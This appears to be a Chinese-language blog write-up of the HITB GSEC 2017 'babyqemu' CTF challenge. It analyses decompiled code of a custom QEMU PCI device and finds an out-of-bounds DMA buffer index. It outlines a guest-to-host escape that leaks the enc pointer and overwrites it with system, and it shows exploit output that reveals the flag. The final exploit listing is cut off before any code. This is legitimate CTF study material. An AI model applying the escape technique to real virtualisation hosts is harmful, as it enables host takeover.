(__fastcall *)(_QWORD, __int64, __int64))_frame_dummy_init_array_entry[v5++])(a1, a2, v3);</span><br><span class="line">    while ( v5 != v4 );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而_frame_dummy_init_array_entry[]里面的有下面的函数指针</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.init_array:0000000000964D68                 dq offset do_qemu_init_pci_hitb_register_types</span><br></pre></td></tr></table></figure>
+
+<p>跟随这个路子一直走，刚好就注册了hitb_info_27046</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl do_qemu_init_pci_hitb_register_types()</span><br><span class="line">&#123;</span><br><span class="line">  register_module_init((void (*)(void))pci_hitb_register_types, MODULE_INIT_QOM_0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void __cdecl pci_hitb_register_types()</span><br><span class="line">&#123;</span><br><span class="line">  type_register_static(&amp;hitb_info_27046);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="MMIO函数"><a href="#MMIO函数" class="headerlink" title="MMIO函数"></a>MMIO函数</h1><p>read函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">uint64_t __fastcall hitb_mmio_read(HitbState *opaque, hwaddr addr, unsigned int size)</span><br><span class="line">&#123;</span><br><span class="line">  uint64_t result; // rax</span><br><span class="line">  uint64_t val; // ST08_8</span><br><span class="line"></span><br><span class="line">  result = -1LL;</span><br><span class="line">  if ( size == 4 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( addr == 128 )</span><br><span class="line">      return opaque-&gt;dma.src;</span><br><span class="line">    if ( addr &gt; 0x80 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( addr == 140 )</span><br><span class="line">        return *(dma_addr_t *)((char *)&amp;opaque-&gt;dma.dst + 4);</span><br><span class="line">      if ( addr &lt;= 0x8C )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( addr == 132 )</span><br><span class="line">          return *(dma_addr_t *)((char *)&amp;opaque-&gt;dma.src + 4);</span><br><span class="line">        if ( addr == 136 )</span><br><span class="line">          return opaque-&gt;dma.dst;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( addr == 144 )</span><br><span class="line">          return opaque-&gt;dma.cnt;</span><br><span class="line">        if ( addr == 152 )</span><br><span class="line">          return opaque-&gt;dma.cmd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( addr == 8 )</span><br><span class="line">      &#123;</span><br><span class="line">        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        val = opaque-&gt;fact;</span><br><span class="line">        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        return val;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( addr &lt;= 8 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = 16777453LL;</span><br><span class="line">        if ( !addr )</span><br><span class="line">          return result;</span><br><span class="line">        if ( addr == 4 )</span><br><span class="line">          return opaque-&gt;addr4;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( addr == 32 )</span><br><span class="line">          return opaque-&gt;status;</span><br><span class="line">        if ( addr == 36 )</span><br><span class="line">          return opaque-&gt;irq_status;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = -1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>write函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall hitb_mmio_write(HitbState *opaque, hwaddr addr, uint64_t val, unsigned int size)</span><br><span class="line">&#123;</span><br><span class="line">  uint32_t v4; // er13</span><br><span class="line">  int v5; // edx</span><br><span class="line">  bool v6; // zf</span><br><span class="line">  int64_t v7; // rax</span><br><span class="line"></span><br><span class="line">  if ( (addr &gt; 0x7F || size == 4) &amp;&amp; (!((size - 4) &amp; 0xFFFFFFFB) || addr &lt;= 0x7F) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( addr == 128 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !(opaque-&gt;dma.cmd &amp; 1) )</span><br><span class="line">        opaque-&gt;dma.src = val;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = val;</span><br><span class="line">      if ( addr &gt; 0x80 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( addr == 140 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( !(opaque-&gt;dma.cmd &amp; 1) )</span><br><span class="line">            *(dma_addr_t *)((char *)&amp;opaque-&gt;dma.dst + 4) = val;</span><br><span class="line">        &#125;</span><br><span class="line">        else if ( addr &gt; 0x8C )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( addr == 144 )</span><br><span class="line">          &#123;</span><br><span class="line">            if ( !(opaque-&gt;dma.cmd &amp; 1) )</span><br><span class="line">              opaque-&gt;dma.cnt = val;</span><br><span class="line">          &#125;</span><br><span class="line">          else if ( addr == 152 &amp;&amp; val &amp; 1 &amp;&amp; !(opaque-&gt;dma.cmd &amp; 1) )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;dma.cmd = val;</span><br><span class="line">            v7 = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);</span><br><span class="line">            timer_mod(</span><br><span class="line">              &amp;opaque-&gt;dma_timer,</span><br><span class="line">              ((signed __int64)((unsigned __int128)(4835703278458516699LL * (signed __int128)v7) &gt;&gt; 64) &gt;&gt; 18)</span><br><span class="line">            - (v7 &gt;&gt; 63)</span><br><span class="line">            + 100);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else if ( addr == 132 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( !(opaque-&gt;dma.cmd &amp; 1) )</span><br><span class="line">            *(dma_addr_t *)((char *)&amp;opaque-&gt;dma.src + 4) = val;</span><br><span class="line">        &#125;</span><br><span class="line">        else if ( addr == 136 &amp;&amp; !(opaque-&gt;dma.cmd &amp; 1) )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;dma.dst = val;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else if ( addr == 32 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( val &amp; 0x80 )</span><br><span class="line">          _InterlockedOr((volatile signed __int32 *)&amp;opaque-&gt;status, 0x80u);</span><br><span class="line">        else</span><br><span class="line">          _InterlockedAnd((volatile signed __int32 *)&amp;opaque-&gt;status, 0xFFFFFF7F);</span><br><span class="line">      &#125;</span><br><span class="line">      else if ( addr &gt; 0x20 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( addr == 96 )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = ((unsigned int)val | opaque-&gt;irq_status) == 0;</span><br><span class="line">          opaque-&gt;irq_status |= val;</span><br><span class="line">          if ( !v6 )</span><br><span class="line">            hitb_raise_irq(opaque, 0x60u);</span><br><span class="line">        &#125;</span><br><span class="line">        else if ( addr == 100 )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = ~(_DWORD)val;</span><br><span class="line">          v6 = (v5 &amp; opaque-&gt;irq_status) == 0;</span><br><span class="line">          opaque-&gt;irq_status &amp;= v5;</span><br><span class="line">          if ( v6 &amp;&amp; !msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">            pci_set_irq(&amp;opaque-&gt;pdev, 0);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else if ( addr == 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        opaque-&gt;addr4 = ~(_DWORD)val;</span><br><span class="line">      &#125;</span><br><span class="line">      else if ( addr == 8 &amp;&amp; !(opaque-&gt;status &amp; 1) )</span><br><span class="line">      &#123;</span><br><span class="line">        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        opaque-&gt;fact = v4;</span><br><span class="line">        _InterlockedOr((volatile signed __int32 *)&amp;opaque-&gt;status, 1u);</span><br><span class="line">        qemu_cond_signal(&amp;opaque-&gt;thr_cond);</span><br><span class="line">        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到read函数返回的都是HitbState的字段，而write函数则是对HitbState字段的写入，应该没啥漏洞，关注下write函数的下面片段，这个应该会调用opaque-&gt;dma_timer的回调函数hitb_dma_timer</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">else if ( addr == 152 &amp;&amp; val &amp; 1 &amp;&amp; !(opaque-&gt;dma.cmd &amp; 1) )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;dma.cmd = val;</span><br><span class="line">          v7 = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);</span><br><span class="line">          timer_mod(</span><br><span class="line">            &amp;opaque-&gt;dma_timer,</span><br><span class="line">            ((signed __int64)((unsigned __int128)(4835703278458516699LL * (signed __int128)v7) &gt;&gt; 64) &gt;&gt; 18)</span><br><span class="line">          - (v7 &gt;&gt; 63)</span><br><span class="line">          + 100);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>qemu_clock_get_ns获取时钟的纳秒值，timer_mod修改dma_timer的expire_time，这样应该可以触发hitb_dma_timer的调用</p>
+<p>这两个函数定义可以看下面的链接<br><a href="https://github.com/qemu/qemu/blob/f2cfa1229e539ee1bb1822912075cf25538ad6b9/include/qemu/timer.h#L96" target="_blank" rel="noopener">https://github.com/qemu/qemu/blob/f2cfa1229e539ee1bb1822912075cf25538ad6b9/include/qemu/timer.h#L96</a><br><a href="https://github.com/qemu/qemu/blob/f2cfa1229e539ee1bb1822912075cf25538ad6b9/include/qemu/timer.h#L666" target="_blank" rel="noopener">https://github.com/qemu/qemu/blob/f2cfa1229e539ee1bb1822912075cf25538ad6b9/include/qemu/timer.h#L666</a></p>
+<h1 id="hitb-dma-timer"><a href="#hitb-dma-timer" class="headerlink" title="hitb_dma_timer"></a>hitb_dma_timer</h1><p>我们看看hitb_dma_timer函数，看这个函数可能算是模拟了DMA（直接存储器访问），可以让我们从读写dma_buf。（看看维基百科的描述：直接内存访问（Direct Memory Access，DMA）是计算机科学中的一种内存访问技术。它允许某些电脑内部的硬件子系统（电脑外设），可以独立地直接读写系统内存，而不需中央处理器（CPU）介入处理 。）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall hitb_dma_timer(HitbState *opaque)</span><br><span class="line">&#123;</span><br><span class="line">  dma_addr_t v1; // rax</span><br><span class="line">  __int64 v2; // rdx</span><br><span class="line">  uint8_t *v3; // rsi</span><br><span class="line">  dma_addr_t v4; // rax</span><br><span class="line">  dma_addr_t v5; // rdx</span><br><span class="line">  uint8_t *v6; // rbp</span><br><span class="line">  uint8_t *v7; // rbp</span><br><span class="line"></span><br><span class="line">  v1 = opaque-&gt;dma.cmd;</span><br><span class="line">  if ( v1 &amp; 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v1 &amp; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (unsigned int)(LODWORD(opaque-&gt;dma.src) - 0x40000);</span><br><span class="line">      if ( v1 &amp; 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = (uint8_t *)&amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">        ((void (__fastcall *)(uint8_t *, _QWORD))opaque-&gt;enc)(v7, LODWORD(opaque-&gt;dma.cnt));</span><br><span class="line">        v3 = v7;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = (uint8_t *)&amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">      &#125;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.dst, v3, opaque-&gt;dma.cnt, 1);// 1是write</span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = opaque-&gt;dma.cmd &amp; 4;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (uint8_t *)&amp;opaque[-36] + (unsigned int)opaque-&gt;dma.dst - 2824;</span><br><span class="line">      LODWORD(v3) = (_DWORD)opaque + opaque-&gt;dma.dst - 0x40000 + 3000;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, 0);</span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = opaque-&gt;dma.cmd &amp; 4;</span><br><span class="line">      if ( opaque-&gt;dma.cmd &amp; 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = (uint8_t *)LODWORD(opaque-&gt;dma.cnt);</span><br><span class="line">        ((void (__fastcall *)(uint8_t *, uint8_t *, dma_addr_t))opaque-&gt;enc)(v6, v3, v5);</span><br><span class="line">        v4 = opaque-&gt;dma.cmd;</span><br><span class="line">        v5 = opaque-&gt;dma.cmd &amp; 4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    opaque-&gt;dma.cmd = v4 &amp; 0xFFFFFFFFFFFFFFFELL;  // 将cmd的最低位置0了</span><br><span class="line">    if ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;irq_status |= 0x100u;</span><br><span class="line">      hitb_raise_irq(opaque, (uint32_t)v3);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数更加opaque-&gt;dma.cmd选择不同的分支，但是cmd的最低bit必须为1</p>
+<p>这里重点是两个分支，一个是cmd&amp;2==1的时候，即第二个bit为1，另一个分支则第二个bit为0</p>
+<p>先看两个都有的cpu_physical_memory_rw，它调用的是address_space_rw</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall cpu_physical_memory_rw(hwaddr addr, uint8_t *buf, int len, int is_write)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // er8</span><br><span class="line">  MemTxAttrs_0 v5; // 0:dl.1</span><br><span class="line"></span><br><span class="line">  v4 = len;</span><br><span class="line">  v5 = (MemTxAttrs_0)1;</span><br><span class="line">  address_space_rw(&amp;address_space_memory, addr, v5, buf, v4, is_write != 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MemTxResult __fastcall address_space_rw(AddressSpace_0 *as, hwaddr addr, MemTxAttrs_0 attrs, uint8_t *buf, int len, _Bool is_write)</span><br><span class="line">&#123;</span><br><span class="line">  MemTxResult result; // eax</span><br><span class="line"></span><br><span class="line">  if ( is_write )</span><br><span class="line">    result = address_space_write(as, addr, attrs, buf, len);</span><br><span class="line">  else</span><br><span class="line">    result = address_space_read_full(as, addr, attrs, buf, len);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以第一个分支cpu_physical_memory_rw最后一个参数是1，所以最终调用的是address_space_write，第二个分支当然就是address_space_read_full</p>
+<p>看address_space_write代码，可以知道<code>cpu_physical_memory_rw(opaque-&gt;dma.dst, v3, opaque-&gt;dma.cnt, 1);</code>是将v3复制到opaque-&gt;dma.dst，即将<code>dma_buf[opaque-&gt;dma.src- 0x40000]</code>读取到opaque-&gt;dma.dst，而<code>cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, 0);</code>则将opaque-&gt;dma.src复制到v6，即将opaque-&gt;dma.src的内容复制到<code>dma_buf[opaque-&gt;dma.dst- 0x40000]</code></p>
+<p>值得注意的是，cpu_physical_memory_rw的第一个参数为硬件地址，即物理地址，所以我们需要将qemu里面的虚拟地址，转化为物理地址。</p>
+<p>分析了这么多，漏洞点就在于对于dma_buf的索引没有任何限制，导致可以越界读写</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>cpu_physical_memory_rw函数的第一个参数，他是一个物理地址，整个过程就是一个中间人的一个功能。<br>cmd= 1|2时，可以通过数组索引越界，将泄露的地址读入物理地址，致我们从这个地址读出，就完成了泄露<br>当cmd=1 时，可以将物理地址上面的值写到任意地址（事前我们可以通过上面cmd= 1|2时，将我们要写入的值写到物理地址）</p>
+<p>漏洞利用思路<br>1、泄露函数指针enc，由于这个qemu-system-x86_64的导入表有system，所以我们直接可以算出system@plt<br>2、用system覆盖enc指针<br>3、写入opaque-&gt;dma_buf为要执行的命令，比如cat flag<br>4、使用cmd=1|2|4时，调用enc函数，劫持控制流</p>
+<p>在编写代码中有一个坑点，你mmio_write的值的大小是8个字节，就会写两次，导致覆盖了下一个值，所以一定要按照src，dst，cnt的顺序来设置</p>
+<p>我们在题目的目录建立一个flag文件用于测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/qemu_escape/HITB-GSEC-2017-babyqemu$ ls</span><br><span class="line">babyqemu.tar.gz   exp    launch.sh                            qemu-system-x86_64  start.txt</span><br><span class="line">breakpoint.txt    exp.c  pc-bios                              rootfs              vmlinuz-4.8.0-52-generic</span><br><span class="line">cpexptorootfs.sh  flag   peda-session-qemu-system-x86_64.txt  rootfs.cpio</span><br><span class="line">giantbranch@ubuntu:~/qemu_escape/HITB-GSEC-2017-babyqemu$ cat flag</span><br><span class="line">flag&#123;You escaped successfully!&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面是逃逸执行system(“cat flag”)的效果（-append ‘console=ttyS0 root=/dev/ram oops=panic panic=1’ 可以让我们在host执行<code>system(cmd)</code>，而输出显示在qemu的命令行中）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__        __   _                            _          _   _ ___ _____ ____</span><br><span class="line">\ \      / /__| | ___ ___  _ __ ___   ___  | |_ ___   | | | |_ _|_   _| __ )</span><br><span class="line"> \ \ /\ / / _ \ |/ __/ _ \| &apos;_ ` _ \ / _ \ | __/ _ \  | |_| || |  | | |  _ \</span><br><span class="line">  \ V  V /  __/ | (_| (_) | | | | | |  __/ | || (_) | |  _  || |  | | | |_) |</span><br><span class="line">   \_/\_/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  |_| |_|___| |_| |____/</span><br><span class="line"></span><br><span class="line">Welcome to HITB</span><br><span class="line">HITB login: root</span><br><span class="line"># ./exp</span><br><span class="line">mmio_base Resource0Base: 0x7ff8115c9000</span><br><span class="line">gva_to_gpa tmpbuf_phys_addr 0x1dee890</span><br><span class="line">hitb_enc_addr: 0x55c0aa03bdd0</span><br><span class="line">binary_base_addr: 0x55c0a9db8000</span><br><span class="line">system_addr: 0x55c0a9fb5b18</span><br><span class="line">flag&#123;You escaped successfully!&#125;</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+
+<p>顺便尝试弹计算器</p>
+<p><img src="http://pic.giantbranch.cn/pic/1575871364598.png" alt="enter description here"></p>
+<p>最终exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span 